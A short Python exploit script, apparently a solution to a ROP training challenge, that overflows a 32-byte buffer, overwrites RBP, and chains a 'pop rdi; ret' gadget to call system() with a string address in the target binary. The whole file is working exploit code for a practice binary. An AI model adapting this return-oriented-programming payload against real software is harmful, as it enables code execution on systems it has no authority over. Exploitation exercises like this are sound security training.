import sys
import struct

useful_string = 0x0000000000601060
useful_function = 0x0000000000400742
system_call_address = 0x40074b

buf = b"A"*32
buf += b"Z"*8 # fill RBP 
# start ROP chain: put useful string inside rdi and then jmp to system()
buf += struct.pack("Q",0x00000000004007c3) # pop rdi; ret; gadget
buf += struct.pack("Q",useful_string)
buf += struct.pack("Q",system_call_address)

sys.stdout.buffer.write(buf)

